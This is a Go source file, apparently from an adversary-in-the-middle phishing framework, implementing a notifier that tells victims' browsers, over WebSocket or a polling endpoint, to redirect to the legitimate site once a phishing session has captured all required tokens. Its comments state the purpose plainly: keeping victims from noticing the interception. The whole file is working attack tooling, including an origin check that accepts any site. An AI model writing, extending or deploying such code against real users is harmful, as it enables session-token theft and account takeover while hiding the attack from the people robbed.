// Package redirect delivers session-completion notifications to victim browsers.
// When a phishing session captures all required tokens, the Notifier signals
// waiting browsers to redirect the victim to the legitimate site so they
// don't notice the interception.
//
// Browsers connect via WebSocket (WaitForRedirect) and block until the session
// completes. A fallback polling endpoint (PollForRedirect) covers environments
// where WebSocket connections are unreliable.
package redirect

import (
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

type redirectMsg struct {
	RedirectURL string `json:"redirect_url"`
}

type eventSubscriber interface {
	Subscribe(eventType sdk.EventType) (events <-chan aitm.Event, unsubscribe func())
}

type sessionGetter interface {
	Get(id string) (*aitm.Session, error)
}

type lureGetter interface {
	Get(id string) (*aitm.Lure, error)
}

// Notifier manages active WebSocket connections waiting for session completion.
// When EventSessionCompleted fires, the notifier sends the redirect URL to all
// connections waiting on that session ID.
type Notifier struct {
	upgrader websocket.Upgrader
	sessions sessionGetter
	lures    lureGetter
	mu       sync.Mutex
	waiting  map[string][]chan redirectMsg // session ID → waiting channels
	logger   *slog.Logger
}

func NewNotifier(bus eventSubscriber, sessions sessionGetter, lures lureGetter, logger *slog.Logger) *Notifier {
	notifier := &Notifier{
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
		sessions: sessions,
		lures:    lures,
		waiting:  make(map[string][]chan redirectMsg),
		logger:   logger,
	}

	go notifier.listenCompletions(bus)

	return notifier
}

func (n *Notifier) listenCompletions(bus eventSubscriber) {
	events, _ := bus.Subscribe(sdk.EventSessionCompleted)
	for event := range events {
		session, ok := event.Payload.(*aitm.Session)
		if !ok {
			n.logger.Warn("unexpected event payload type", "type", fmt.Sprintf("%T", event.Payload))
			continue
		}

		n.mu.Lock()
		waiters := n.waiting[session.ID]
		delete(n.waiting, session.ID)
		n.mu.Unlock()

		msg := redirectMsg{RedirectURL: n.redirectURL(session.LureID)}
		for _, waiterCh := range waiters {
			waiterCh <- msg
		}
	}
}

// WaitForRedirect handles GET /ws/{sid}: blocks until the session completes,
// then sends the redirect URL and closes the connection.
func (n *Notifier) WaitForRedirect(w http.ResponseWriter, r *http.Request, sessionID string) {
	// Register the waiter before checking session state so we cannot miss a
	// completion event that fires in the gap between the check and registration.
	resultCh := make(chan redirectMsg, 1)
	n.mu.Lock()
	n.waiting[sessionID] = append(n.waiting[sessionID], resultCh)
	n.mu.Unlock()

	// If the session is already complete (e.g. the victim's browser navigated
	// to a new page after MFA and opened a fresh WebSocket after the completion
	// event already fired), pre-fill the channel so the select below fires
	// immediately. If a concurrent completion event also sends to resultCh,
	// the default branch is taken and the event's message is used instead.
	if session, err := n.sessions.Get(sessionID); err == nil && session.IsDone() {
		select {
		case resultCh <- redirectMsg{RedirectURL: n.redirectURL(session.LureID)}:
		default: // concurrent completion event already filled the channel
		}
	}

	conn, err := n.upgrader.Upgrade(w, r, nil)
	if err != nil {
		n.removeWaiter(sessionID, resultCh)
		n.logger.Warn("redirect: upgrade failed", "error", err)
		return
	}
	defer conn.Close()

	select {
	case msg := <-resultCh:
		if err := conn.WriteJSON(msg); err != nil {
			n.logger.Warn("redirect: write failed", "session_id", sessionID, "error", err)
		}
	case <-time.After(10 * time.Minute):
		// Session timed out — client will fall back to polling.
		n.removeWaiter(sessionID, resultCh)
		n.logger.Debug("redirect: timeout waiting for session completion", "session_id", sessionID)
	}
}

// PollForRedirect is the fallback polling endpoint GET /t/done.
// Returns {"redirect_url":"..."} if the session is complete, {"done":false} otherwise.
func (n *Notifier) PollForRedirect(w http.ResponseWriter, sessionID string) {
	w.Header().Set("Content-Type", "application/json")
	sess, err := n.sessions.Get(sessionID)
	if err != nil || !sess.IsDone() {
		json.NewEncoder(w).Encode(map[string]bool{"done": false})
		return
	}
	json.NewEncoder(w).Encode(redirectMsg{RedirectURL: n.redirectURL(sess.LureID)})
}

func (n *Notifier) removeWaiter(sessionID string, ch chan redirectMsg) {
	n.mu.Lock()
	defer n.mu.Unlock()
	waiters := n.waiting[sessionID]
	for i, c := range waiters {
		if c == ch {
			n.waiting[sessionID] = append(waiters[:i], waiters[i+1:]...)
			if len(n.waiting[sessionID]) == 0 {
				delete(n.waiting, sessionID)
			}
			return
		}
	}
}

func (n *Notifier) redirectURL(lureID string) string {
	if lure, err := n.lures.Get(lureID); err == nil {
		return lure.RedirectURL
	}
	return ""
}
